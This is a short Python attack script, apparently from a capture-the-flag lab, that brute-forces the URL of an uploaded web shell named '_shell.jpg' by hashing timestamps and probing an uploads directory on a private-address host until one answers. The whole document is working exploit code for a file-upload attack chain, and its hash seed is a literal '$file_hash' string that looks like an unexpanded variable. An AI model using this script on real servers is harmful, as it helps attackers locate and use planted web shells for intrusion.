import requests
import time
import hashlib
import sys
def md5(text: str)-> str:
    return hashlib.md5(text.encode('utf-8')).hexdigest()
proxies = None # {"http": "localhost:8080"}
upload_dir = "http://10.129.93.50/images/uploads/"
file_name = "_shell.jpg"
upload_time = round(time.time())

while True:
    print("\rAttempting: md5(%s)"% ('$file_hash' + str(upload_time)) +
file_name,end='')
    abs_path = upload_dir+md5('$file_hash' + str(upload_time)) + file_name
    req = requests.get(abs_path, proxies = proxies)
    if req.status_code == 200:
        print("\n[+] Found %s" % (abs_path))
        sys.exit()
    upload_time = upload_time - 1
